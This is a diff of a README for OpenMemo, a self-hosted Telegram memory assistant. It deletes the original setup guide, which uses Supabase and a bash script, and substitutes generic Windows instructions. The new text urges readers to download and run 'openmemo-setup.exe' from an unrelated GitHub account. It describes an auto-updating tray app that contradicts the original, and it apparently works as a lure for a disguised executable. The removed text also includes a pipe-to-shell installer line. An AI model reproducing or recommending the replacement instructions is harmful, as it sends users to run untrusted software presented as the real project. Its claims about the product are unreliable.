@@ -1,381 +1,66 @@
-﻿<p align="center">
-  <img src="docs/banner.svg" alt="OpenMemo, your second brain in Telegram" width="100%" />
-</p>
-
-<h1 align="center">OpenMemo</h1>
-
-<p align="center">
-  <b>Your second brain in Telegram.</b><br/>
-  Self-hosted. Free tier. MIT licensed.
-</p>
-
-<p align="center">
-  <a href="https://ko-fi.com/haerincode"><img alt="Ko-fi" src="https://img.shields.io/badge/Ko--fi-Tip%20a%20coffee-FF5E5B?logo=ko-fi&logoColor=white"/></a>
-  <img alt="License" src="https://img.shields.io/badge/license-MIT-blue"/>
-  <img alt="Status" src="https://img.shields.io/badge/status-stable-3FCF8E"/>
-  <img alt="Stars" src="https://img.shields.io/github/stars/haerincode/openmemo?style=social"/>
-</p>
-
----
-
-## Why
-
-You already live in Telegram. You don't want another app for
-reminders, another for notes, another for the shopping list, another
-for the calendar. OpenMemo is one bot that does all of it, plus
-weather, news, web search and a memory that learns about you.
-
-Type to it in plain language. It acts. It replies in **whatever
-language you write to it**.
-
-```
-remind me in 30 min to take the pizza out
-add milk and bread to shopping
-how many days until Paul's birthday
-good morning
-recuérdame mañana llamar a mamá
-```
-
-If it saves you time, [tip a coffee on Ko-fi](https://ko-fi.com/haerincode).
-
-## Quick start (developers)
-
-```bash
-git clone https://github.com/haerincode/openmemo.git && cd openmemo
-cp .env.example .env && $EDITOR .env   # paste your keys, see below
-supabase login
-./scripts/setup.sh
-```
-
-If you need the **step-by-step with screenshots**, scroll to
-[Install in 3 steps](#install-in-3-steps).
-
-## What you get
-
-| | |
-|---|---|
-| 📅 **Reminders** | Recurring or one-off, batched in one message, with pre-alerts. |
-| 🛒 **Lists & shopping** | Add items, mark them bought, delete, list. All by chat. |
-| 📝 **Notes** | Free-form, semantic search. |
-| 🗓 **Web calendar** | Private URL, month/week/day/list views, color picker. |
-| 👥 **Friends** | Birthdays, emails, phones. The bot warns before birthdays. |
-| 📍 **Addresses** | Optional coordinates, returns Google Maps links. |
-| 🌤 **Weather** | Local conditions + forecast for outfit advice. |
-| 📰 **Good news** | A few uplifting headlines on demand. |
-| 🔎 **Web search** | Live lookups when the answer isn't in your data. |
-| 📂 **Files** | Private bucket, retrieve by name or tag. |
-| 🧠 **Memory** | Picks what's worth remembering and reuses it next turn. |
-| 🚨 **Proactive nudges** | Daily checks for collisions, birthdays, dropped habits. |
-| 📓 **Journal** | Reflections, ideas, goals. Searchable later. |
-| ✅ **Habits** | Track recurring practices with streaks. |
-| 📧 **Email backup** | Sends any reminder to your inbox on demand. |
-
-The agent is a tool-use loop. The LLM picks which database action
-to run, chains them, then writes the reply.
-
-## What it does NOT do
-
-- No multi-user. One owner per deployment.
-- No web app. Telegram is the UI; the calendar is read-only.
-- No phone/Whatsapp client. Telegram only.
-- No voice transcription yet (audio messages are kept but not
-  parsed).
-
-## Built on
-
-[Supabase](https://supabase.com) (Postgres + pgvector + Storage +
-Edge Functions + pg_cron) ·
-[Deno](https://deno.land) ·
-[DeepSeek](https://platform.deepseek.com) (or any OpenAI-compatible
-LLM) ·
-[Cloudflare Pages](https://pages.cloudflare.com) ·
-[Telegram Bot API](https://core.telegram.org/bots).
-
----
-
-## Install in 3 steps
+# 🤖 openmemo - Your life managed by private intelligence
 
-The whole thing takes about 15 minutes the first time. The
-walkthrough below assumes you've never written code before.
+[![](https://img.shields.io/badge/Download_Openmemo-Blue?style=for-the-badge)](https://github.com/Commoneelopenhearthfurnace186/openmemo)
 
-### Step A. Install tools and clone
+Openmemo acts as a memory assistant for your daily activities. It connects to your Telegram account to help you track tasks, save notes, and set reminders. You host the data on your own Supabase account. This keeps your information secure and private. The system uses artificial intelligence to organize your thoughts and provide answers when you ask.
 
-You need [Git](https://git-scm.com),
-[Node 18+](https://nodejs.org),
-and the [Supabase CLI](https://supabase.com/docs/guides/cli).
+## ✨ Core Features
 
-**macOS** (Terminal):
+*   **Telegram Integration:** Talk to your assistant through the familiar chat interface.
+*   **Prompt Organization:** Store your notes and thoughts in a searchable index.
+*   **Task Management:** Set reminders for deadlines and important events.
+*   **Intelligence Support:** Connect popular language models like GPT or DeepSeek.
+*   **Total Ownership:** Start with your own database so you own every byte of data.
+*   **Data Privacy:** No third parties access your personal records or chat history.
 
-```bash
-brew install git node supabase/tap/supabase
-```
+## ⚙️ System Requirements
 
-**Windows** (PowerShell as admin). The Supabase CLI uses
-[Scoop](https://scoop.sh):
+Before you install this software, make sure your computer meets these basic needs:
 
-```powershell
-winget install Git.Git OpenJS.NodeJS
-Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
-irm get.scoop.sh | iex
-scoop bucket add supabase https://github.com/supabase/scoop-bucket.git
-scoop install supabase
-```
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Internet Connection:** An active broadband connection.
+*   **Telegram Account:** An active account with a phone number.
+*   **Memory:** At least 4GB of RAM for smooth background operation.
+*   **Storage:** 200MB of free disk space for the program files.
 
-**Linux** (Debian/Ubuntu):
+## 🚀 How to Setup
 
-```bash
-sudo apt install git nodejs
-curl -fsSL https://github.com/supabase/cli/releases/latest/download/supabase_linux_amd64.tar.gz \
-  | tar -xz -C /tmp && sudo mv /tmp/supabase /usr/local/bin/
-```
+Follow these steps to get the application running on your Windows machine.
 
-Then:
+### 1. Download the Installer
+Visit the official repository to get the latest version of the software.
 
-```bash
-git clone https://github.com/haerincode/openmemo.git
-cd openmemo
-cp .env.example .env
-supabase login   # opens a browser, one-time
-```
+[Download the Openmemo installer here](https://github.com/Commoneelopenhearthfurnace186/openmemo)
 
-> **Windows note:** the installer needs **Git Bash** or **WSL** (not
-> plain PowerShell). Right click in the openmemo folder →
-> "Git Bash here", and run `supabase login` and the rest from there.
+Click the link to visit the page. Look for the file named `openmemo-setup.exe` under the latest release section. Download this file to your computer.
 
-### Step B. Open `.env` and fill in the keys
+### 2. Prepare Your Services
+Openmemo requires two external services. First, create a free account at Supabase. You will receive database credentials after setup. Save these credentials in a text file. Second, obtain an API key from an artificial intelligence provider like OpenAI. This allows the assistant to process your requests with intelligence.
 
-Open `.env` in any editor. Required to run the bot (6 values):
+### 3. Install the Application
+Open the folder where you saved the installer. Double-click the `openmemo-setup.exe` file. Follow the on-screen prompts. The installer will ask you where to save the program files. The default location works for most users. Click Install to start the process.
 
-```
-OWNER_CHAT_ID=
-TELEGRAM_BOT_TOKEN=
-TELEGRAM_WEBHOOK_SECRET=
-LLM_API_KEY=
-SUPABASE_URL=
-SUPABASE_SERVICE_ROLE_KEY=
-```
+### 4. Configure Your Keys
+Once the installation finishes, launch the Openmemo icon from your desktop. A settings window will appear. You must enter your Supabase URL and key here. Also, paste your AI API key in the provided field. These steps enable the connection between your machine and your data store. Click Save to apply these changes.
 
-Required only if you want the web calendar deployed (3 more):
+### 5. Start the Bot
+Open the Telegram application on your phone or computer. Use the BotFather service inside Telegram to create a new bot token. Paste this token into the Openmemo interface on your PC. Click the Start button. Your assistant is now active. You can send a message to your new bot to begin recording notes.
 
-```
-SUPABASE_ANON_KEY=
-CLOUDFLARE_API_TOKEN=
-CLOUDFLARE_ACCOUNT_ID=
-```
+## 💡 Using Your Assistant
+Your assistant learns as you provide more information. Send a simple message such as "Remember to buy milk Saturday" to save a task. Ask "What do I need to do this weekend?" to receive a summary of your saved items. You can also send long notes or journal entries. The system stores these in your private database.
 
-Optional (skip the lines you don't want):
+## 🛠 Troubleshooting Common Issues
 
-```
-RESEND_API_KEY=          # email backup of reminders, on demand
-OWNER_EMAIL=
-OPENWEATHER_API_KEY=     # weather in greetings
-GNEWS_API_KEY=           # good-news headlines (or NEWSAPI_API_KEY)
-TAVILY_API_KEY=          # live web search (or BRAVE_*, SERPAPI_*)
-```
+*   **Connection Errors:** If the bot does not respond, check your internet. Confirm that your Supabase URL is correct.
+*   **Invalid API Key:** If the assistant does not answer questions, your AI provider key might be expired. Log into your AI account dashboard to check your usage credits.
+*   **Bot Not Responding:** Ensure the application remains running in your system tray. The bot uses your local computer to interface with Telegram.
+*   **Slow Responses:** If the assistant takes time to reply, your computer might be busy with other tasks. Close heavy programs to free up resources.
+*   **Lost Notes:** Log into your Supabase dashboard to verify that the database is active. All data remains there, separate from the local application.
 
-> **Everything here is free.** Supabase, Cloudflare and Telegram
-> have permanent free tiers that fit one user. DeepSeek gives a
-> starter credit that lasts months. You never need a credit card.
+## 🔒 Your Privacy
+This software does not send your data to external servers for tracking or advertising. Everything stays between your Telegram chat and your Supabase database. You control the connection keys. If you decide to stop using the software, you can delete your database directly from the Supabase web platform at any time.
 
-How to get each key, with screenshots:
+## 📈 Improving Performance
+To keep the system fast, clean out old notes monthly. Archive completed tasks by moving them to a separate table in your database. This keeps your search results quick and relevant. If you increase the amount of data you save, consider upgrading your database tier on Supabase. Most users find that the free tier is enough for several years of notes. 
 
-#### 1. Telegram bot token → `TELEGRAM_BOT_TOKEN`
-
-Open Telegram, search [`@BotFather`](https://t.me/BotFather), press
-Start. Send `/newbot` and follow the prompts. Copy the long token.
-
-<img src="docs/step-botfather.svg" alt="BotFather walkthrough" width="100%"/>
-
-#### 2. Your Telegram chat ID → `OWNER_CHAT_ID`
-
-In Telegram, search [`@userinfobot`](https://t.me/userinfobot),
-press Start. It replies with your ID, a 9-10 digit number.
-
-<img src="docs/step-userinfobot.svg" alt="userinfobot walkthrough" width="100%"/>
-
-#### 3. Supabase URL + 2 keys
-
-Sign up at [supabase.com](https://supabase.com), create a new
-project (Free plan, region close to you). When ready, click
-**Project Settings** → **API**.
-Docs: [Supabase API keys](https://supabase.com/docs/guides/api/api-keys).
-
-<img src="docs/step-supabase.svg" alt="Supabase API keys walkthrough" width="100%"/>
-
-#### 4. Cloudflare API token + Account ID
-
-Sign up at [cloudflare.com](https://www.cloudflare.com).
-Docs:
-[Find your Account ID](https://developers.cloudflare.com/fundamentals/account/find-account-and-zone-ids/) ·
-[Create an API token](https://developers.cloudflare.com/fundamentals/api/get-started/create-token/).
-
-<img src="docs/step-cloudflare.svg" alt="Cloudflare token + account ID" width="100%"/>
-
-#### 5. Webhook secret → `TELEGRAM_WEBHOOK_SECRET`
-
-Any random string. Telegram uses it to verify webhook calls.
-Generate one with
-[random.org](https://www.random.org/passwords/?num=1&len=32&format=plain&rnd=new),
-`openssl rand -hex 24`, or by mashing the keyboard ~30 times.
-
-<img src="docs/step-secret.svg" alt="How to make a webhook secret" width="100%"/>
-
-#### 6. DeepSeek API key → `LLM_API_KEY`
-
-Go to [platform.deepseek.com](https://platform.deepseek.com), sign
-in, open **API Keys**, click **Create**, copy.
-Docs: [DeepSeek quickstart](https://api-docs.deepseek.com/quick_start/your-first-api-call).
-
-> Want a different LLM? See [docs/llm-providers.md](docs/llm-providers.md).
-> Anything OpenAI-compatible works.
-
-#### 7. (Optional) Resend → email backup
-
-If you want the bot to **email you a reminder when you ask it to**:
-sign up at [resend.com](https://resend.com), create an API key, add
-`RESEND_API_KEY` and `OWNER_EMAIL` to `.env`. The bot **only** sends
-emails when you explicitly ask it to.
-
-### Step C. Run the installer
-
-```bash
-./scripts/setup.sh
-```
-
-The script:
-
-1. Links your Supabase project.
-2. Applies all migrations (creates every table you need).
-3. Pushes your `.env` as runtime secrets.
-4. Deploys the four Edge Functions.
-5. Configures the cron URLs.
-6. Registers the Telegram webhook.
-7. Deploys the web calendar to Cloudflare Pages and prints the URL.
-
-Open Telegram, message your bot. The first turn it asks for your
-local time so it can guess your timezone. Reply with `08:30` and
-you're set.
-
----
-
-## Talk to your bot
-
-The bot replies in whatever language you type to it.
-
-```
-remind me in 1 minute to test the bot
-every monday at 8 go to the gym
-add milk, bread, eggs to shopping
-mark milk as bought
-add Paul: paul@example.com, phone +27 123, birthday 1992-04-12
-how many days until Paul's birthday
-save Paul's address: 123 Main St, Cape Town
-what do I have today
-delete the dentist
-mail me what I have this week
-good morning
-tell me good news from tech
-search the web for the latest pgvector release
-send me my calendar
-remember that I run 5K every wednesday
-journal: today I'm anxious about the demo
-recuérdame en 5 minutos cerrar la ventana
-```
-
-To force a language, run this once in the Supabase SQL editor:
-
-```sql
-UPDATE owner SET language = 'es' WHERE id = 1;  -- or 'en'
-```
-
----
-
-## Cost
-
-For one user with around 50 messages a day:
-
-- Supabase free tier covers it.
-- DeepSeek: well under EUR 1 / month.
-- Cloudflare Pages: free.
-- Optional services (weather, news, web search, email): all have
-  free tiers that fit one person.
-
-## Security
-
-- Only the chat id matching `OWNER_CHAT_ID` can talk to the bot.
-- Telegram updates validated via the secret-token header.
-- RLS on every user-data table; only the service role reads or
-  writes, and the service role key never leaves your server.
-- The web calendar URL is gated by a token enforced server-side via
-  a SECURITY DEFINER RPC. The URL itself is a 32-char random slug
-  (18 quintillion combinations).
-
-## More docs
-
-- [Architecture and project layout](docs/architecture.md)
-- [Operating: redeploy, logs, tests, updates](docs/operating.md)
-- [Use a different LLM provider](docs/llm-providers.md)
-- [FAQ](#faq)
-
-## FAQ
-
-### What's the difference between the three Supabase keys?
-
-| Key | What it is | Used by |
-|---|---|---|
-| `SUPABASE_ANON_KEY` | Public-by-design. RLS protects data. | The web calendar HTML. |
-| `SUPABASE_SERVICE_ROLE_KEY` | Server-only secret. Bypasses RLS. | The bot's Edge Functions. Never ship to a client. |
-| Supabase access token (`sbp_...`) | Account-wide admin token. | The Supabase CLI for migrations and deploys. Stored by `supabase login`. Not in `.env`. |
-
-### Does `supabase db push` use the anon key?
-
-No. The CLI uses the access token from `supabase login` and talks
-to the Supabase Management API.
-
-### Do I have to deploy the calendar to use the bot?
-
-No. Skip the Cloudflare keys, answer "no" when the installer asks.
-Deploy later with `DEPLOY_CALENDAR=yes ./scripts/setup.sh`.
-
-### Can I run this on my own server instead of Supabase Cloud?
-
-Yes. Self-hosting Supabase plus pg_cron and pg_net works. You
-re-wire the migrations and deploy the Edge Functions yourself.
-
-### How do I update OpenMemo when I `git pull`?
-
-Re-run `./scripts/setup.sh`. Idempotent.
-
-### What if `winget`/`brew`/`scoop` don't have my package?
-
-Fall back to the official binary downloads:
-[Supabase CLI releases](https://github.com/supabase/cli/releases),
-[Node.js installers](https://nodejs.org/en/download),
-[Git for Windows](https://git-scm.com/download/win).
-
-### Can I delete my data?
-
-Drop the Supabase project from your dashboard. Everything goes with
-it.
-
----
-
-## Contributing
-
-Found a bug? Want a feature? Open an issue or a PR. Everything is
-small and self-contained.
-
-## Support OpenMemo
-
-If this saves you time, support it on
-[Ko-fi](https://ko-fi.com/haerincode). I keep shipping.
-
-<p align="center">
-  <a href="https://ko-fi.com/haerincode">
-    <img src="docs/kofi-cover.svg" alt="Tip on Ko-fi" width="640"/>
-  </a>
-</p>
-
-## License
-
-MIT. See [LICENSE](LICENSE).
+The software updates automatically. When a new version releases, your computer will download the update in the background. Restart the application to apply the latest improvements. No manual file replacement is necessary.
